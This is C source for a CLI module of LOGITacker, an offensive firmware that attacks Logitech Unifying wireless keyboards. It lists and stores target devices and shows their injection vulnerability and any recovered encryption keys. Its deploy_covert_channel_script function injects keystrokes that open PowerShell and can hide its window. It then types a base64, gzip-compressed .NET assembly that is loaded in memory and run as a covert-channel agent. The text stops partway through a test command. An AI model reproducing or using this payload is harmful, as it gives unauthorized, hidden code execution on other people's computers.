#include "fds.h"
#include "fds_internal_defs.h"
#include "nrf_fstorage.h"
#include "nrf_fstorage_nvmc.h"
#include "ctype.h"
#include "logitacker_tx_payload_provider.h"
#include "logitacker_tx_pay_provider_string_to_keys.h"
#include "logitacker_processor_passive_enum.h"
#include "logitacker_options.h"
#include "logitacker_keyboard_map.h"
#include "nrf_cli.h"
#include "nrf_log.h"
#include "sdk_common.h"
#include "logitacker.h"
#include "logitacker_devices.h"
#include "helper.h"
#include "logitacker_unifying.h"
#include "logitacker_flash.h"
#include "logitacker_processor_inject.h"
#include "logitacker_script_engine.h"
#include "logitacker_processor_covert_channel.h"

//#define CLI_TEST_COMMANDS

static void cmd_devices_remove_all(nrf_cli_t const * p_cli, size_t argc, char **argv);
static void cmd_script_press(nrf_cli_t const *p_cli, size_t argc, char **argv);

#define STORED_DEVICES_AUTOCOMPLETE_LIST_MAX_ENTRIES 60
static char m_stored_device_addr_str_list[STORED_DEVICES_AUTOCOMPLETE_LIST_MAX_ENTRIES][LOGITACKER_DEVICE_ADDR_STR_LEN];
static int m_stored_device_addr_str_list_len = 0;
static char m_device_addr_str_list[LOGITACKER_DEVICES_DEVICE_LIST_MAX_ENTRIES][LOGITACKER_DEVICE_ADDR_STR_LEN];
static int m_device_addr_str_list_len = 0;
static char m_device_addr_str_list_first_entry[] = "all\x00";

#define STORED_SCRIPTS_AUTOCOMPLETE_LIST_MAX_ENTRIES 32
static char m_stored_script_names_str_list[STORED_SCRIPTS_AUTOCOMPLETE_LIST_MAX_ENTRIES][LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN];
static int m_stored_script_names_str_list_len = 0;

void deploy_covert_channel_script(bool hide) {
    char * agentscript = "$b=\"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\";nal no New-Object -F;$m=no IO.MemoryStream;$a=no byte[] 1024;$gz=(no IO.Compression.GZipStream((no IO.MemoryStream -ArgumentList @(,[Convert]::FromBase64String($b))), [IO.Compression.CompressionMode]::Decompress));$n=0;do{$n=$gz.Read($a,0,$a.Length);$m.Write($a,0,$n)}while ($n -gt 0);[System.Reflection.Assembly]::Load($m.ToArray());[LogitackerClient.Runner]::Run()\n";
    //char * agentscript = "Get-Date\n";
    char chunk[129] = {0};

    logitacker_script_engine_flush_tasks();

    logitacker_script_engine_append_task_press_combo("GUI r");
    logitacker_script_engine_append_task_delay(500);
    logitacker_script_engine_append_task_type_string("powershell.exe\n");
    logitacker_script_engine_append_task_delay(2000);

    if (hide) {
        logitacker_script_engine_append_task_type_string("$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);");
        logitacker_script_engine_append_task_type_string("$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName(\"WindowsBase\")).GetType(\"MS.Win32.UnsafeNativeMethods\"))::SetWindowPos($hw,$i,0,0,100,100,16512)\n");
        logitacker_script_engine_append_task_delay(500);
    }

    while (strlen(agentscript) >= 128) {
        memcpy(chunk, agentscript, 128); //keep last byte 0x00
        logitacker_script_engine_append_task_type_string(chunk);
        agentscript += 128; //advance pointer
    }
    memset(chunk,0,129);
    memcpy(chunk, agentscript, strlen(agentscript)); //keep last byte 0x00
    logitacker_script_engine_append_task_type_string(chunk);
}


static void stored_devices_str_list_update() {
    m_stored_device_addr_str_list_len = 1;
    memcpy(&m_stored_device_addr_str_list[0], m_device_addr_str_list_first_entry, sizeof(m_device_addr_str_list_first_entry));

    fds_find_token_t ftok;
    fds_record_desc_t record_desc;
    fds_flash_record_t flash_record;
    memset(&ftok, 0x00, sizeof(fds_find_token_t));

    while(fds_record_find(LOGITACKER_FLASH_FILE_ID_DEVICES, LOGITACKER_FLASH_RECORD_KEY_DEVICES, &record_desc, &ftok) == FDS_SUCCESS &&
    m_stored_device_addr_str_list_len <= STORED_DEVICES_AUTOCOMPLETE_LIST_MAX_ENTRIES) {
        if (fds_record_open(&record_desc, &flash_record) != FDS_SUCCESS) {
            NRF_LOG_WARNING("Failed to open record");
            continue; // go on with next
        }

        logitacker_devices_unifying_device_t const * p_device = flash_record.p_data;
        helper_addr_to_hex_str(m_stored_device_addr_str_list[m_stored_device_addr_str_list_len], LOGITACKER_DEVICE_ADDR_LEN, p_device->rf_address);
        m_stored_device_addr_str_list_len++;


        if (fds_record_close(&record_desc) != FDS_SUCCESS) {
            NRF_LOG_WARNING("Failed to close record");
        }
    }

}

static void stored_script_names_str_list_update() {
    fds_find_token_t ftoken;
    memset(&ftoken, 0x00, sizeof(fds_find_token_t));
    fds_flash_record_t flash_record;
    fds_record_desc_t fds_record_desc;

    m_stored_script_names_str_list_len = 0;
    while(m_stored_script_names_str_list_len < STORED_SCRIPTS_AUTOCOMPLETE_LIST_MAX_ENTRIES && fds_record_find(LOGITACKER_FLASH_FILE_ID_STORED_SCRIPTS_INFO, LOGITACKER_FLASH_RECORD_KEY_STORED_SCRIPTS_INFO, &fds_record_desc, &ftoken) == FDS_SUCCESS) {
        if (fds_record_open(&fds_record_desc, &flash_record) != FDS_SUCCESS) {
            NRF_LOG_WARNING("failed to open record");
            continue; // go on with next
        }

        stored_script_fds_info_t const * p_stored_tasks_fds_info_tmp = flash_record.p_data;

        int slen = strlen(p_stored_tasks_fds_info_tmp->script_name);
        slen = slen >= LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN ? LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN-1 : slen;
        memcpy(m_stored_script_names_str_list[m_stored_script_names_str_list_len], p_stored_tasks_fds_info_tmp->script_name, slen);

        if (fds_record_close(&fds_record_desc) != FDS_SUCCESS) {
            NRF_LOG_WARNING("failed to close record");
        }

        m_stored_script_names_str_list_len++;
    }
}

static void device_address_str_list_update() {
    m_device_addr_str_list_len = 1;
    memcpy(&m_device_addr_str_list[0], m_device_addr_str_list_first_entry, sizeof(m_device_addr_str_list_first_entry));

    logitacker_devices_list_iterator_t iter = {0};
    logitacker_devices_unifying_device_t * p_device;

    while (logitacker_devices_get_next_device(&p_device, &iter) == NRF_SUCCESS) {
        helper_addr_to_hex_str(m_device_addr_str_list[m_device_addr_str_list_len], LOGITACKER_DEVICE_ADDR_LEN, p_device->rf_address);
        m_device_addr_str_list_len++;
    }

}

// dynamic creation of stored script name list
static void dynamic_script_name(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";

    if (idx == 0) stored_script_names_str_list_update();

    //NRF_LOG_INFO("script list len %d", m_stored_script_names_str_list_len);

    if (idx >= m_stored_script_names_str_list_len) {
        p_static->p_syntax = NULL;
        return;
    }

    p_static->p_syntax = m_stored_script_names_str_list[idx];
}

static void dynamic_device_addr_list_ram_with_all(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";


    if (idx == 0) {
        device_address_str_list_update(); // update list if idx 0 is requested
        p_static->p_syntax = m_device_addr_str_list[0];
        p_static->handler = cmd_devices_remove_all;
        p_static->p_help = "remove all devices";
    } else if (idx < m_device_addr_str_list_len) {
        p_static->p_syntax = m_device_addr_str_list[idx];
    } else {
        p_static->p_syntax = NULL;
    }
}

static void dynamic_device_addr_list_ram_with_usb(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";


    if (idx == 0) {
        device_address_str_list_update(); // update list if idx 0 is requested
        memcpy(m_device_addr_str_list[0], "USB\x00", 4);
        p_static->p_syntax = m_device_addr_str_list[0];
    } else if (idx < m_device_addr_str_list_len) {
        p_static->p_syntax = m_device_addr_str_list[idx];
    } else {
        p_static->p_syntax = NULL;
    }
}

// dynamic creation of command addresses
static void dynamic_device_addr_list_ram(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";

    if (idx == 0) device_address_str_list_update();

    if (idx < m_device_addr_str_list_len-1) {
        p_static->p_syntax = m_device_addr_str_list[idx+1]; //ignore first entry
    } else {
        p_static->p_syntax = NULL;
    }
}
/*
// dynamic creation of command addresses
static void dynamic_device_addr_list_stored_with_all(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";


    if (idx == 0) {
        stored_devices_str_list_update(); // update list if idx 0 is requested
        p_static->p_syntax = m_device_addr_str_list[0];
        p_static->handler = NULL;
        p_static->p_help = "remove all devices";
    } else if (idx < m_stored_device_addr_str_list_len) {
        p_static->p_syntax = m_stored_device_addr_str_list[idx];
    } else {
        p_static->p_syntax = NULL;
    }
}
 */

// dynamic creation of command addresses
static void dynamic_device_addr_list_stored(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";

    if (idx == 0) stored_devices_str_list_update();

    if (idx < m_stored_device_addr_str_list_len-1) {
        p_static->p_syntax = m_stored_device_addr_str_list[idx+1]; //ignore first entry
    } else {
        p_static->p_syntax = NULL;
    }
}



static void print_logitacker_device_info(nrf_cli_t const * p_cli, const logitacker_devices_unifying_device_t * p_device) {
    if (p_device == NULL) {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "empty device pointer");
        return;
    }
    logitacker_devices_unifying_dongle_t * p_dongle = p_device->p_dongle;
    if (p_dongle == NULL) {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "empty dongle pointer");
        return;
    }

    char tmp_addr_str[16];
    helper_addr_to_hex_str(tmp_addr_str, LOGITACKER_DEVICE_ADDR_LEN, p_device->rf_address);

    // select print color based on device data
    bool dev_is_logitech = p_dongle->classification == DONGLE_CLASSIFICATION_IS_LOGITECH_UNIFYING;
    nrf_cli_vt100_color_t outcol = NRF_CLI_VT100_COLOR_DEFAULT;
    if (dev_is_logitech) outcol = NRF_CLI_VT100_COLOR_BLUE;
    //if (p_device->vuln_forced_pairing) outcol = NRF_CLI_VT100_COLOR_YELLOW;
    if (p_device->vuln_plain_injection) outcol = NRF_CLI_VT100_COLOR_GREEN;
    if (p_device->key_known) outcol = NRF_CLI_VT100_COLOR_RED;

    /*
    nrf_cli_fprintf(p_cli, outcol, "%s %s, keyboard: %s (%s, %s), mouse: %s\r\n",
        nrf_log_push(tmp_addr_str),
        p_dongle->classification == DONGLE_CLASSIFICATION_IS_LOGITECH_UNIFYING ? "Logitech device" : "unknown device",
        (p_device->report_types & LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD) > 0 ?  "yes" : "no",
        (p_device->caps & LOGITACKER_DEVICE_CAPS_LINK_ENCRYPTION) > 0 ?  "encrypted" : "not encrypted",
        p_device->key_known ?  "key ḱnown" : "key unknown",
        (p_device->report_types & LOGITACKER_DEVICE_REPORT_TYPES_MOUSE) > 0 ?  "yes" : "no"
        );
    */

    nrf_cli_fprintf(p_cli, outcol, "%s", tmp_addr_str);
    nrf_cli_fprintf(p_cli, outcol, " '%s'", strlen(p_device->device_name) == 0 ? "unknown name" : p_device->device_name);

    nrf_cli_fprintf(p_cli, outcol, " keyboard: ");
    if ((p_device->report_types & LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD) > 0) {
        nrf_cli_fprintf(p_cli, outcol, "%s", (p_device->caps & LOGITACKER_DEVICE_CAPS_LINK_ENCRYPTION) > 0 ? "encrypted" : "unencrypted");
    } else {
        nrf_cli_fprintf(p_cli, outcol, "no");
    }

    nrf_cli_fprintf(p_cli, outcol, " mouse: %s", (p_device->report_types & LOGITACKER_DEVICE_REPORT_TYPES_MOUSE) > 0 ? "yes" : "no");
    nrf_cli_fprintf(p_cli, outcol, "\r\n");

    nrf_cli_fprintf(p_cli, outcol, "\tclass: ");
    switch (p_dongle->classification) {
        case DONGLE_CLASSIFICATION_IS_LOGITECH_G700:
            nrf_cli_fprintf(p_cli, outcol, "Logitech G700/G700s");
            break;
        case DONGLE_CLASSIFICATION_IS_LOGITECH_LIGHTSPEED:
            nrf_cli_fprintf(p_cli, outcol, "Logitech LIGHTSPEED");
            break;
        case DONGLE_CLASSIFICATION_UNKNOWN:
            nrf_cli_fprintf(p_cli, outcol, "Unknown");
            break;
        case DONGLE_CLASSIFICATION_IS_NOT_LOGITECH:
            nrf_cli_fprintf(p_cli, outcol, "Not Logitech");
            break;
        case DONGLE_CLASSIFICATION_IS_LOGITECH_UNIFYING:
            nrf_cli_fprintf(p_cli, outcol, "Logitech Unifying compatible");
            break;
    }
    nrf_cli_fprintf(p_cli, outcol, " device WPID: 0x%.2x%.2x", p_device->wpid[0], p_device->wpid[1]);
    nrf_cli_fprintf(p_cli, outcol, " dongle WPID: 0x%.2x%.2x", p_dongle->wpid[0], p_dongle->wpid[1]);
    if (p_dongle->is_nordic) nrf_cli_fprintf(p_cli, outcol, " (Nordic)");
    if (p_dongle->is_texas_instruments) nrf_cli_fprintf(p_cli, outcol, " (Texas Instruments)");
    nrf_cli_fprintf(p_cli, outcol, "\r\n");

    if (p_device->key_known) {
        nrf_cli_fprintf(p_cli, outcol, "\tlink key: ");
        for (int i=0; i<16; i++) nrf_cli_fprintf(p_cli, outcol, "%.02x", p_device->key[i]);
        nrf_cli_fprintf(p_cli, outcol, "\r\n");
    }


}

#ifdef CLI_TEST_COMMANDS

static void cmd_testled(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1) {
        int count;
        if (sscanf(argv[1], "%d", &count) != 1) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid argument, auto inject count has to be a integer number, but '%s' was given\r\n", argv[1]);
        } else {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "Toggle LED %d\r\n", count);
            switch (count) {
                case 0:
                    bsp_board_led_invert(BSP_BOARD_LED_0);
                    break;
                case 1:
                    bsp_board_led_invert(BSP_BOARD_LED_1);
                    break;
                case 2:
                    bsp_board_led_invert(BSP_BOARD_LED_2);
                    break;
                case 3:
                    bsp_board_led_invert(BSP_BOARD_LED_3);
                    break;
            }
        }
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid argument, testled arg has to be a integer number\r\n");
    }
}



static void cmd_test_a(nrf_cli_t const * p_cli, size_t argc, char **argv)
{

    fds_stat_t fds_stats;
    fds_stat(&fds_stats);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "CLIS STATS\r\n-------------------\r\n");
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "pages available: %d\r\n", fds_stats.pages_available);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "open records   : %d\r\n", fds_stats.open_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "valid records  : %d\r\n", fds_stats.valid_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "dirty records  : %d\r\n", fds_stats.dirty_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "words reserved : %d\r\n", fds_stats.words_reserved);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "words used     : %d\r\n", fds_stats.words_used);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "largest contig : %d\r\n", fds_stats.largest_contig);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "freeable words : %d\r\n", fds_stats.freeable_words);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "corruption     : %s\r\n", fds_stats.corruption ? "true" : "false");

    //fds_gc();
}


static void cmd_test_b(nrf_cli_t const * p_cli, size_t argc, char **argv) {
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "usb report received  : %d\r\n", g_logitacker_global_runtime_state.usb_led_out_report_count);
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "usb script triggered: %s\r\n", g_logitacker_global_runtime_state.usb_inject_script_triggered ? "true" : "false");
        deploy_covert_channel_script(true);
}

static void cmd_test_c(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    fds_find_token_t ft;
    memset(&ft, 0x00, sizeof(fds_find_token_t));
    fds_record_desc_t rd;


    fds_flash_record_t flash_record;

    char * tmp_str[256] = {0};

